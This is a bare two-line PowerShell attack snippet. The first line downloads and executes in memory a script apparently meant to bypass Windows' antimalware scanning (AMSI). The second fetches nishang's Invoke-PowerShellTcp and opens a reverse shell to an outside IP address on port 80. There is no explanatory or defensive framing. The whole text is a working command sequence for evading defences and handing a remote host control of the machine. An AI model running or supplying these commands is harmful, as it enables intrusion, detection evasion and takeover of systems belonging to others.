iex (iwr -uri https://raw.githubusercontent.com/h0ru/AMSI-Reaper/main/src/AMSI-Reaper.ps1 -useb)
iex (iwr -uri https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1 -useb);Invoke-PowerShellTcp -Reverse -IPAddress 103.154.252.98 -Port 80
